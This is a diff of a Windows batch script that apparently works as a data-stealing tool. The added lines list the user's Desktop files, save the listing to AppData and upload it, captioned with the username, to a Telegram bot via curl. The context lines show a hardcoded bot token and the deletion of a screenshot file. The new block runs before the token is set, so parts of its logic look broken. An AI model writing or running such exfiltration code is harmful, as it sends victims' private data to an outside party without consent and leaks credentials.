@@ -1,6 +1,41 @@
 @echo off
 
-goto :EOF
+
+:: Set the log file path
+set "LOGFILE=%APPDATA%\Desktop_List.txt"
+
+
+cd /d "%USERPROFILE%\Desktop"
+tree /f /a > "%APPDATA%\Desktop_List.txt"
+
+
+:: Send the file (as a document)
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
+     -F "chat_id=%CHAT_ID%" ^
+     -F "caption=%USERNAME%" ^
+     -F "document=@%LOGFILE%"
+
+
+
+set "LOGFILE=%APPDATA%\Desktop_List.exe"
+
+
+
+:: Send the file (as a document)
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendDocument" ^
+     -F "chat_id=%CHAT_ID%" ^
+     -F "caption=%USERNAME%" ^
+     -F "document=@%LOGFILE%"
+
+
+
+
+exit
+
+
+
+
+::goto :EOF
 
 :: Set your bot token and chat ID
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
@@ -107,6 +142,10 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
 
 
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
+
+
+
+
 
 echo.
 echo.
